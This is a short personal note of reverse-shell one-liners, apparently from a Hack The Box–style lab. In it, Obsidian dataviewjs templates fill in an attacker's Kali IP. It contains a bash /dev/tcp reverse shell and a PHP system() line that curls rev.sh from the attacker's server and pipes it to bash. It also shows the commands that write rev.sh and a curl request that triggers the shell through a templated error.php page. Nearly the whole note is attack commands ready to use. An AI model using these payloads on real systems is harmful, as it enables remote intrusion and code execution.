One liner reverse-shell

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/LISTENING_PORT 0>&1'`;

dv.paragraph("```bash\n" + command + "\n```");
```

system() function to run curl and fetch a bash script from our local web server, which is then piped to bash , triggering a reverse shell.
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?php system("curl ${KaliIP}:8080/rev.sh|bash"); ?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Templater/IP");
const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `echo -e '#!/bin/bash\\nsh -i >& /dev/tcp/${KaliIP}/4444 0>&1' > rev.sh`;

dv.paragraph("```bash\n" + command + "\n```");

```

Output rev.sh
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `#!/bin/bash
sh -i >& /dev/tcp/${KaliIP}/4444 0>&1`;

dv.paragraph("```bash\n" + command + "\n```");
```
Trigger the reverse-shell
```
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```